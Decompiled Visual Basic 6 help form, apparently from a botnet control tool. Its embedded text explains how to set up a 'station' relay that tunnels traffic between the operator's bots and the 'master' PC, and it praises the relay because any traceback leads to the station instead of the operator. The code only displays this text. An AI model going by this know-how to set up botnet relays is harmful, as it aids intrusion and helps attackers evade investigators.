VERSION 5.00
Begin VB.Form frmStationHelp
  Caption = "Help - Station"
  ScaleMode = 1
  AutoRedraw = False
  FontTransparent = True
  BorderStyle = 5 'Sizable ToolWindow
  'Icon = n/a
  LinkTopic = "Form1"
  MaxButton = 0   'False
  MinButton = 0   'False
  ClientLeft = 120
  ClientTop = 390
  ClientWidth = 8415
  ClientHeight = 8535
  StartUpPosition = 2 'CenterScreen
  Begin VB.TextBox txtMain
    Left = 0
    Top = 0
    Width = 8415
    Height = 8535
    TabIndex = 0
    MultiLine = -1  'True
    ScrollBars = 2
    Locked = -1  'True
  End
End

Attribute VB_Name = "frmStationHelp"


Private sub Form__8870E4
008870E4: push ebp
008870E5: mov ebp, esp
008870E7: sub esp, 0000000Ch
008870EA: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008870EF: mov eax, fs:[00h]
008870F5: push eax
008870F6: mov fs:[00000000h], esp
008870FD: mov eax, 000003ECh
00887102: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00887107: push ebx
00887108: push esi
00887109: push edi
0088710A: mov var_0C, esp
0088710D: mov var_08, 0040DD10h
00887114: mov eax, [ebp+08h]
00887117: and eax, 00000001h
0088711A: mov var_04, eax
0088711D: mov eax, [ebp+08h]
00887120: and al, FEh
00887122: mov [ebp+08h], eax
00887125: mov eax, [ebp+08h]
00887128: mov eax, [eax]
0088712A: push [ebp+08h]
0088712D: call [eax+04h]
00887130: mov eax, [ebp+08h]
00887133: mov eax, [eax]
00887135: push [ebp+08h]
00887138: call [eax+000002FCh]
0088713E: push eax
0088713F: lea eax, var_7C
00887142: push eax
00887143: call 00410A84h ; Set (object)
00887148: mov var_000003F0, eax
0088714E: push 00458460h ; The station will tunnel the internet traffic between your bots and your PC.
00887153: push 00441264h ; vbCrLf
00887158: call 00410A18h ; &
0088715D: mov edx, eax
0088715F: lea ecx, var_18
00887162: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00887167: push eax
00887168: push 004584FCh ; All you have to do is installing the station on a PC that will allow incomming/outgoing connections through the chosen ports.
0088716D: call 00410A18h ; &
00887172: mov edx, eax
00887174: lea ecx, var_1C
00887177: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0088717C: push eax
0088717D: push 00441264h ; vbCrLf
00887182: call 00410A18h ; &
00887187: mov edx, eax
00887189: lea ecx, var_20
0088718C: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00887191: push eax
00887192: push 00441264h ; vbCrLf
00887197: call 00410A18h ; &
0088719C: mov edx, eax
0088719E: lea ecx, var_24
008871A1: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008871A6: push eax
008871A7: push 0045864Ch ; Master IP/DNS: IP or DNS that's pointed to the master (you).
008871AC: call 00410A18h ; &
008871B1: mov edx, eax
008871B3: lea ecx, var_28
008871B6: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008871BB: push eax
008871BC: push 00441264h ; vbCrLf
008871C1: call 00410A18h ; &
008871C6: mov edx, eax
008871C8: lea ecx, var_2C
008871CB: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008871D0: push eax
008871D1: push 004586CCh ; Note: You can't use same IP/DNS as your bots are connecting to. Do that only if you want to test the station on your own PC.
008871D6: call 00410A18h ; &
008871DB: mov edx, eax
008871DD: lea ecx, var_30
008871E0: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008871E5: push eax
008871E6: push 00441264h ; vbCrLf
008871EB: call 00410A18h ; &
008871F0: mov edx, eax
008871F2: lea ecx, var_34
008871F5: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008871FA: push eax
008871FB: push 00441264h ; vbCrLf
00887200: call 00410A18h ; &
00887205: mov edx, eax
00887207: lea ecx, var_38
0088720A: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0088720F: push eax
00887210: push 00458840h ; Master port: The port which the master is listening on. This is needed when the station needs to redirect traffic to the master (you).
00887215: call 00410A18h ; &
0088721A: mov edx, eax
0088721C: lea ecx, var_3C
0088721F: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00887224: push eax
00887225: push 00441264h ; vbCrLf
0088722A: call 00410A18h ; &
0088722F: mov edx, eax
00887231: lea ecx, var_40
00887234: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00887239: push eax
0088723A: push 00441264h ; vbCrLf
0088723F: call 00410A18h ; &
00887244: mov edx, eax
00887246: lea ecx, var_44
00887249: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0088724E: push eax
0088724F: push 00458A20h ; Master transfer port: The transfer port which the master is listening on. This is needed when the station needs to redirect file transfer(s) to the master (you).
00887254: call 00410A18h ; &
00887259: mov edx, eax
0088725B: lea ecx, var_48
0088725E: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00887263: push eax
00887264: push 00441264h ; vbCrLf
00887269: call 00410A18h ; &
0088726E: mov edx, eax
00887270: lea ecx, var_4C
00887273: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00887278: push eax
00887279: push 00441264h ; vbCrLf
0088727E: call 00410A18h ; &
00887283: mov edx, eax
00887285: lea ecx, var_50
00887288: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0088728D: push eax
0088728E: push 00458B68h ; Bot port: Same port used when you created bot.
00887293: call 00410A18h ; &
00887298: mov edx, eax
0088729A: lea ecx, var_54
0088729D: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008872A2: push eax
008872A3: push 00441264h ; vbCrLf
008872A8: call 00410A18h ; &
008872AD: mov edx, eax
008872AF: lea ecx, var_58
008872B2: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008872B7: push eax
008872B8: push 00458954h ; Note: You can use same port as Master port. (Recommended)
008872BD: call 00410A18h ; &
008872C2: mov edx, eax
008872C4: lea ecx, var_5C
008872C7: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008872CC: push eax
008872CD: push 00441264h ; vbCrLf
008872D2: call 00410A18h ; &
008872D7: mov edx, eax
008872D9: lea ecx, var_60
008872DC: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008872E1: push eax
008872E2: push 00441264h ; vbCrLf
008872E7: call 00410A18h ; &
008872EC: mov edx, eax
008872EE: lea ecx, var_64
008872F1: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008872F6: push eax
008872F7: push 004587CCh ; Bot transfer port: Same port used when you created bot
008872FC: call 00410A18h ; &
00887301: mov edx, eax
00887303: lea ecx, var_68
00887306: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0088730B: push eax
0088730C: push 00441264h ; vbCrLf
00887311: call 00410A18h ; &
00887316: mov edx, eax
00887318: lea ecx, var_6C
0088731B: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00887320: push eax
00887321: push 00458C10h ; Note: You can use same port as Master transfer port. (Recommended)
00887326: call 00410A18h ; &
0088732B: mov edx, eax
0088732D: lea ecx, var_70
00887330: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00887335: push eax
00887336: push 00441264h ; vbCrLf
0088733B: call 00410A18h ; &
00887340: mov edx, eax
00887342: lea ecx, var_74
00887345: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0088734A: push eax
0088734B: push 00441264h ; vbCrLf
00887350: call 00410A18h ; &
00887355: mov var_000000A4, eax
0088735B: mov var_000000AC, 00000008h
00887365: mov var_00000264, 0044A82Ch
0088736F: mov var_0000026C, 00000008h
00887379: lea edx, var_0000026C
0088737F: lea ecx, var_0000008C
00887385: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0088738A: lea eax, var_0000008C
00887390: push eax
00887391: push 00000032h
00887393: lea eax, var_0000009C
00887399: push eax
0088739A: call 00410B98h ; arg_1 = String(arg_2)
0088739F: mov var_00000274, 00441264h ; vbCrLf
008873A9: mov var_0000027C, 00000008h
008873B3: mov var_00000284, 00441264h ; vbCrLf
008873BD: mov var_0000028C, 00000008h
008873C7: mov var_00000294, 00458C9Ch ; Advantages:
008873D1: mov var_0000029C, 00000008h
008873DB: mov var_000002A4, 00441264h ; vbCrLf
008873E5: mov var_000002AC, 00000008h
008873EF: mov var_000002B4, 00458CBCh ; 1. Improved security! Any traceback will lead to the station PC.
008873F9: mov var_000002BC, 00000008h
00887403: mov var_000002C4, 00441264h ; vbCrLf
0088740D: mov var_000002CC, 00000008h
00887417: mov var_000002D4, 00458DF0h ; 2. Improved performance! If station is running on a powerful PC, then master will be able handle a big number of bots without losing performance.
00887421: mov var_000002DC, 00000008h
0088742B: mov var_000002E4, 00441264h ; vbCrLf
00887435: mov var_000002EC, 00000008h
0088743F: mov var_000002F4, 00458F18h ; 3. You can manage bots from an unlimited number of stations.
00887449: mov var_000002FC, 00000008h
00887453: mov var_00000304, 00441264h ; vbCrLf
0088745D: mov var_0000030C, 00000008h
00887467: mov var_00000314, 00441264h ; vbCrLf
00887471: mov var_0000031C, 00000008h
0088747B: mov var_00000324, 00458F98h ; Disadvantages:
00887485: mov var_0000032C, 00000008h
0088748F: mov var_00000334, 00441264h ; vbCrLf
00887499: mov var_0000033C, 00000008h
008874A3: mov var_00000344, 00458D44h ; 1. Somewhat slower traffic speed.
008874AD: mov var_0000034C, 00000008h
008874B7: mov var_00000354, 00441264h ; vbCrLf
008874C1: mov var_0000035C, 00000008h
008874CB: mov var_00000364, 00458FD4h ; Note: this depends on the station PC's performance, its internet connection speed and the ping between the master and the station PC.
008874D5: mov var_0000036C, 00000008h
008874DF: mov var_00000374, 00441264h ; vbCrLf
008874E9: mov var_0000037C, 00000008h
008874F3: mov var_00000384, 00441264h ; vbCrLf
008874FD: mov var_0000038C, 00000008h
00887507: mov var_00000394, 0044A82Ch
00887511: mov var_0000039C, 00000008h
0088751B: lea edx, var_0000039C
00887521: lea ecx, var_000001EC
00887527: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0088752C: lea eax, var_000001EC
00887532: push eax
00887533: push 00000032h
00887535: lea eax, var_000001FC
0088753B: push eax
0088753C: call 00410B98h ; arg_1 = String(arg_2)
00887541: mov var_000003A4, 00441264h ; vbCrLf
0088754B: mov var_000003AC, 00000008h
00887555: mov var_000003B4, 00441264h ; vbCrLf
0088755F: mov var_000003BC, 00000008h
00887569: mov var_000003C4, 004590E4h ; NOTE: If a station gets broken, or removed due to other reasons, then please don't panic...
00887573: mov var_000003CC, 00000008h
0088757D: mov var_000003D4, 00441264h ; vbCrLf
00887587: mov var_000003DC, 00000008h
00887591: mov var_000003E4, 004591C4h ; Your bots are still alive and all you have to do is setting up a new station where bots can connect to, or simply point the DNS used with the station back to the master.
0088759B: mov var_000003EC, 00000008h
008875A5: lea eax, var_000000AC
008875AB: push eax
008875AC: lea eax, var_0000009C
008875B2: push eax
008875B3: lea eax, var_000000BC
008875B9: push eax
008875BA: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008875BF: push eax
008875C0: lea eax, var_0000027C
008875C6: push eax
008875C7: lea eax, var_000000CC
008875CD: push eax
008875CE: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008875D3: push eax
008875D4: lea eax, var_0000028C
008875DA: push eax
008875DB: lea eax, var_000000DC
008875E1: push eax
008875E2: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008875E7: push eax
008875E8: lea eax, var_0000029C
008875EE: push eax
008875EF: lea eax, var_000000EC
008875F5: push eax
008875F6: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008875FB: push eax
008875FC: lea eax, var_000002AC
00887602: push eax
00887603: lea eax, var_000000FC
00887609: push eax
0088760A: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0088760F: push eax
00887610: lea eax, var_000002BC
00887616: push eax
00887617: lea eax, var_0000010C
0088761D: push eax
0088761E: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00887623: push eax
00887624: lea eax, var_000002CC
0088762A: push eax
0088762B: lea eax, var_0000011C
00887631: push eax
00887632: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00887637: push eax
00887638: lea eax, var_000002DC
0088763E: push eax
0088763F: lea eax, var_0000012C
00887645: push eax
00887646: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0088764B: push eax
0088764C: lea eax, var_000002EC
00887652: push eax
00887653: lea eax, var_0000013C
00887659: push eax
0088765A: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0088765F: push eax
00887660: lea eax, var_000002FC
00887666: push eax
00887667: lea eax, var_0000014C
0088766D: push eax
0088766E: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00887673: push eax
00887674: lea eax, var_0000030C
0088767A: push eax
0088767B: lea eax, var_0000015C
00887681: push eax
00887682: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00887687: push eax
00887688: lea eax, var_0000031C
0088768E: push eax
0088768F: lea eax, var_0000016C
00887695: push eax
00887696: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0088769B: push eax
0088769C: lea eax, var_0000032C
008876A2: push eax
008876A3: lea eax, var_0000017C
008876A9: push eax
008876AA: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008876AF: push eax
008876B0: lea eax, var_0000033C
008876B6: push eax
008876B7: lea eax, var_0000018C
008876BD: push eax
008876BE: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008876C3: push eax
008876C4: lea eax, var_0000034C
008876CA: push eax
008876CB: lea eax, var_0000019C
008876D1: push eax
008876D2: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008876D7: push eax
008876D8: lea eax, var_0000035C
008876DE: push eax
008876DF: lea eax, var_000001AC
008876E5: push eax
008876E6: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008876EB: push eax
008876EC: lea eax, var_0000036C
008876F2: push eax
008876F3: lea eax, var_000001BC
008876F9: push eax
008876FA: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008876FF: push eax
00887700: lea eax, var_0000037C
00887706: push eax
00887707: lea eax, var_000001CC
0088770D: push eax
0088770E: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00887713: push eax
00887714: lea eax, var_0000038C
0088771A: push eax
0088771B: lea eax, var_000001DC
00887721: push eax
00887722: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00887727: push eax
00887728: lea eax, var_000001FC
0088772E: push eax
0088772F: lea eax, var_0000020C
00887735: push eax
00887736: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0088773B: push eax
0088773C: lea eax, var_000003AC
00887742: push eax
00887743: lea eax, var_0000021C
00887749: push eax
0088774A: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0088774F: push eax
00887750: lea eax, var_000003BC
00887756: push eax
00887757: lea eax, var_0000022C
0088775D: push eax
0088775E: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00887763: push eax
00887764: lea eax, var_000003CC
0088776A: push eax
0088776B: lea eax, var_0000023C
00887771: push eax
00887772: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00887777: push eax
00887778: lea eax, var_000003DC
0088777E: push eax
0088777F: lea eax, var_0000024C
00887785: push eax
00887786: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0088778B: push eax
0088778C: lea eax, var_000003EC
00887792: push eax
00887793: lea eax, var_0000025C
00887799: push eax
0088779A: call 004109F4h ; msvbvm60.dll.__vbaVarCat
0088779F: push eax
008877A0: lea eax, var_78
008877A3: push eax
008877A4: call 0041097Ch ; msvbvm60.dll.__vbaStrVarVal
008877A9: push eax
008877AA: mov eax, var_000003F0
008877B0: mov eax, [eax]
008877B2: push var_000003F0
008877B8: call [eax+000000A4h]
008877BE: fclex 
008877C0: mov var_000003F4, eax
008877C6: cmp var_000003F4, 00000000h
008877CD: jnl 8877F2h
008877CF: push 000000A4h
008877D4: push 00440E08h
008877D9: push var_000003F0
008877DF: push var_000003F4
008877E5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008877EA: mov var_00000400, eax
008877F0: jmp 8877F9h
008877F2: and var_00000400, 00000000h
008877F9: lea eax, var_78
008877FC: push eax
008877FD: lea eax, var_74
00887800: push eax
00887801: lea eax, var_70
00887804: push eax
00887805: lea eax, var_6C
00887808: push eax
00887809: lea eax, var_68
0088780C: push eax
0088780D: lea eax, var_64
00887810: push eax
00887811: lea eax, var_60
00887814: push eax
00887815: lea eax, var_5C
00887818: push eax
00887819: lea eax, var_58
0088781C: push eax
0088781D: lea eax, var_54
00887820: push eax
00887821: lea eax, var_50
00887824: push eax
00887825: lea eax, var_4C
00887828: push eax
00887829: lea eax, var_48
0088782C: push eax
0088782D: lea eax, var_44
00887830: push eax
00887831: lea eax, var_40
00887834: push eax
00887835: lea eax, var_3C
00887838: push eax
00887839: lea eax, var_38
0088783C: push eax
0088783D: lea eax, var_34
00887840: push eax
00887841: lea eax, var_30
00887844: push eax
00887845: lea eax, var_2C
00887848: push eax
00887849: lea eax, var_28
0088784C: push eax
0088784D: lea eax, var_24
00887850: push eax
00887851: lea eax, var_20
00887854: push eax
00887855: lea eax, var_1C
00887858: push eax
00887859: lea eax, var_18
0088785C: push eax
0088785D: push 00000019h
0088785F: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00887864: add esp, 00000068h
00887867: lea ecx, var_7C
0088786A: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0088786F: lea eax, var_0000025C
00887875: push eax
00887876: lea eax, var_0000024C
0088787C: push eax
0088787D: lea eax, var_0000023C
00887883: push eax
00887884: lea eax, var_0000022C
0088788A: push eax
0088788B: lea eax, var_0000021C
00887891: push eax
00887892: lea eax, var_0000020C
00887898: push eax
00887899: lea eax, var_000001FC
0088789F: push eax
008878A0: lea eax, var_000001DC
008878A6: push eax
008878A7: lea eax, var_000001EC
008878AD: push eax
008878AE: lea eax, var_000001CC
008878B4: push eax
008878B5: lea eax, var_000001BC
008878BB: push eax
008878BC: lea eax, var_000001AC
008878C2: push eax
008878C3: lea eax, var_0000019C
008878C9: push eax
008878CA: lea eax, var_0000018C
008878D0: push eax
008878D1: lea eax, var_0000017C
008878D7: push eax
008878D8: lea eax, var_0000016C
008878DE: push eax
008878DF: lea eax, var_0000015C
008878E5: push eax
008878E6: lea eax, var_0000014C
008878EC: push eax
008878ED: lea eax, var_0000013C
008878F3: push eax
008878F4: lea eax, var_0000012C
008878FA: push eax
008878FB: lea eax, var_0000011C
00887901: push eax
00887902: lea eax, var_0000010C
00887908: push eax
00887909: lea eax, var_000000FC
0088790F: push eax
00887910: lea eax, var_000000EC
00887916: push eax
00887917: lea eax, var_000000DC
0088791D: push eax
0088791E: lea eax, var_000000CC
00887924: push eax
00887925: lea eax, var_000000BC
0088792B: push eax
0088792C: lea eax, var_0000009C
00887932: push eax
00887933: lea eax, var_000000AC
00887939: push eax
0088793A: lea eax, var_0000008C
00887940: push eax
00887941: push 0000001Eh
00887943: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00887948: add esp, 0000007Ch
0088794B: mov var_04, 00000000h
00887952: push 00887AB0h
00887957: jmp 00887AAFh
0088795C: lea eax, var_78
0088795F: push eax
00887960: lea eax, var_74
00887963: push eax
00887964: lea eax, var_70
00887967: push eax
00887968: lea eax, var_6C
0088796B: push eax
0088796C: lea eax, var_68
0088796F: push eax
00887970: lea eax, var_64
00887973: push eax
00887974: lea eax, var_60
00887977: push eax
00887978: lea eax, var_5C
0088797B: push eax
0088797C: lea eax, var_58
0088797F: push eax
00887980: lea eax, var_54
00887983: push eax
00887984: lea eax, var_50
00887987: push eax
00887988: lea eax, var_4C
0088798B: push eax
0088798C: lea eax, var_48
0088798F: push eax
00887990: lea eax, var_44
00887993: push eax
00887994: lea eax, var_40
00887997: push eax
00887998: lea eax, var_3C
0088799B: push eax
0088799C: lea eax, var_38
0088799F: push eax
008879A0: lea eax, var_34
008879A3: push eax
008879A4: lea eax, var_30
008879A7: push eax
008879A8: lea eax, var_2C
008879AB: push eax
008879AC: lea eax, var_28
008879AF: push eax
008879B0: lea eax, var_24
008879B3: push eax
008879B4: lea eax, var_20
008879B7: push eax
008879B8: lea eax, var_1C
008879BB: push eax
008879BC: lea eax, var_18
008879BF: push eax
008879C0: push 00000019h
008879C2: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008879C7: add esp, 00000068h
008879CA: lea ecx, var_7C
008879CD: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008879D2: lea eax, var_0000025C
008879D8: push eax
008879D9: lea eax, var_0000024C
008879DF: push eax
008879E0: lea eax, var_0000023C
008879E6: push eax
008879E7: lea eax, var_0000022C
008879ED: push eax
008879EE: lea eax, var_0000021C
008879F4: push eax
008879F5: lea eax, var_0000020C
008879FB: push eax
008879FC: lea eax, var_000001FC
00887A02: push eax
00887A03: lea eax, var_000001EC
00887A09: push eax
00887A0A: lea eax, var_000001DC
00887A10: push eax
00887A11: lea eax, var_000001CC
00887A17: push eax
00887A18: lea eax, var_000001BC
00887A1E: push eax
00887A1F: lea eax, var_000001AC
00887A25: push eax
00887A26: lea eax, var_0000019C
00887A2C: push eax
00887A2D: lea eax, var_0000018C
00887A33: push eax
00887A34: lea eax, var_0000017C
00887A3A: push eax
00887A3B: lea eax, var_0000016C
00887A41: push eax
00887A42: lea eax, var_0000015C
00887A48: push eax
00887A49: lea eax, var_0000014C
00887A4F: push eax
00887A50: lea eax, var_0000013C
00887A56: push eax
00887A57: lea eax, var_0000012C
00887A5D: push eax
00887A5E: lea eax, var_0000011C
00887A64: push eax
00887A65: lea eax, var_0000010C
00887A6B: push eax
00887A6C: lea eax, var_000000FC
00887A72: push eax
00887A73: lea eax, var_000000EC
00887A79: push eax
00887A7A: lea eax, var_000000DC
00887A80: push eax
00887A81: lea eax, var_000000CC
00887A87: push eax
00887A88: lea eax, var_000000BC
00887A8E: push eax
00887A8F: lea eax, var_000000AC
00887A95: push eax
00887A96: lea eax, var_0000009C
00887A9C: push eax
00887A9D: lea eax, var_0000008C
00887AA3: push eax
00887AA4: push 0000001Eh
00887AA6: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00887AAB: add esp, 0000007Ch
00887AAE: ret 
End Sub

Private sub Form__887ACF
00887ACF: push ebp
00887AD0: mov ebp, esp
00887AD2: sub esp, 00000018h
00887AD5: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00887ADA: mov eax, fs:[00h]
00887AE0: push eax
00887AE1: mov fs:[00000000h], esp
00887AE8: push 0000006Ch
00887AEA: pop eax
00887AEB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00887AF0: push ebx
00887AF1: push esi
00887AF2: push edi
00887AF3: mov var_18, esp
00887AF6: mov var_14, 0040DD20h
00887AFD: mov eax, [ebp+08h]
00887B00: and eax, 00000001h
00887B03: mov var_10, eax
00887B06: mov eax, [ebp+08h]
00887B09: and al, FEh
00887B0B: mov [ebp+08h], eax
00887B0E: mov var_0C, 00000000h
00887B15: mov eax, [ebp+08h]
00887B18: mov eax, [eax]
00887B1A: push [ebp+08h]
00887B1D: call [eax+04h]
00887B20: mov var_04, 00000001h
00887B27: mov var_04, 00000002h
00887B2E: push FFFFFFFFh
00887B30: call 00410A60h ; On Error ...
00887B35: mov var_04, 00000003h
00887B3C: lea eax, var_58
00887B3F: push eax
00887B40: mov eax, [ebp+08h]
00887B43: mov eax, [eax]
00887B45: push [ebp+08h]
00887B48: call [eax+00000080h]
00887B4E: fclex 
00887B50: mov var_60, eax
00887B53: cmp var_60, 00000000h
00887B57: jnl 887B76h
00887B59: push 00000080h
00887B5E: push 00443868h
00887B63: push [ebp+08h]
00887B66: push var_60
00887B69: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00887B6E: mov var_00000084, eax
00887B74: jmp 887B7Dh
00887B76: and var_00000084, 00000000h
00887B7D: mov eax, [ebp+08h]
00887B80: mov eax, [eax]
00887B82: push [ebp+08h]
00887B85: call [eax+000002FCh]
00887B8B: push eax
00887B8C: lea eax, var_24
00887B8F: push eax
00887B90: call 00410A84h ; Set (object)
00887B95: mov var_68, eax
00887B98: lea eax, var_5C
00887B9B: push eax
00887B9C: mov eax, [ebp+08h]
00887B9F: mov eax, [eax]
00887BA1: push [ebp+08h]
00887BA4: call [eax+00000088h]
00887BAA: fclex 
00887BAC: mov var_64, eax
00887BAF: cmp var_64, 00000000h
00887BB3: jnl 887BD2h
00887BB5: push 00000088h
00887BBA: push 00443868h
00887BBF: push [ebp+08h]
00887BC2: push var_64
00887BC5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00887BCA: mov var_00000088, eax
00887BD0: jmp 887BD9h
00887BD2: and var_00000088, 00000000h
00887BD9: fld real4 ptr var_5C
00887BDC: fstp real4 ptr var_4C
00887BDF: mov var_54, 00000004h
00887BE6: fld real4 ptr var_58
00887BE9: fsub real4 ptr [00402BA4h]
00887BEF: fstp real4 ptr var_3C
00887BF2: fstsw ax
00887BF4: test al, 0Dh
00887BF6: jnz 00887CC4h
00887BFC: mov var_44, 00000004h
00887C03: and var_2C, 00000000h
00887C07: mov var_34, 00000002h
00887C0E: push 00000010h
00887C10: pop eax
00887C11: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00887C16: lea esi, var_54
00887C19: mov edi, esp
00887C1B: movsd 
00887C1C: movsd 
00887C1D: movsd 
00887C1E: movsd 
00887C1F: push 00000010h
00887C21: pop eax
00887C22: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00887C27: lea esi, var_44
00887C2A: mov edi, esp
00887C2C: movsd 
00887C2D: movsd 
00887C2E: movsd 
00887C2F: movsd 
00887C30: push 00000010h
00887C32: pop eax
00887C33: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00887C38: lea esi, var_34
00887C3B: mov edi, esp
00887C3D: movsd 
00887C3E: movsd 
00887C3F: movsd 
00887C40: movsd 
00887C41: fldz 
00887C43: push ecx
00887C44: fstp real4 ptr [esp]
00887C47: mov eax, var_68
00887C4A: mov eax, [eax]
00887C4C: push var_68
00887C4F: call [eax+00000224h]
00887C55: fclex 
00887C57: mov var_6C, eax
00887C5A: cmp var_6C, 00000000h
00887C5E: jnl 887C7Dh
00887C60: push 00000224h
00887C65: push 00440E08h
00887C6A: push var_68
00887C6D: push var_6C
00887C70: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00887C75: mov var_0000008C, eax
00887C7B: jmp 887C84h
00887C7D: and var_0000008C, 00000000h
00887C84: lea ecx, var_24
00887C87: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00887C8C: mov var_10, 00000000h
00887C93: wait 
00887C94: push 00887CA5h
00887C99: jmp 887CA4h
00887C9B: lea ecx, var_24
00887C9E: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00887CA3: ret 
End Sub

